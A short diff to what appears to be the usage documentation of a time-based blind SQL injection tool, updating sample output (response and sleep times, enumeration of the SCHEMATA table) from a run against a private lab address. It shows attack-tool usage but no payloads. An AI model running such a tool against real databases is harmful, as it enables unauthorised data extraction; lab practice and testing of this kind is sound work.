@@ -7,8 +7,8 @@ python time_based_blind_sql_injection.py -u "http://192.168.33.10/sqli/time_base
 * Starting attack on URL: http://192.168.33.10/sqli/time_based_blind_escaped.php
 
 * Using 4 thread/s
-* Average response time: 0 s
-* Using sleep time: 0 s
+* Average response time: 0.014702 s
+* Using sleep time: 0.147019 s
 
 ```
 Determinating number of rows of table: SCHEMATA
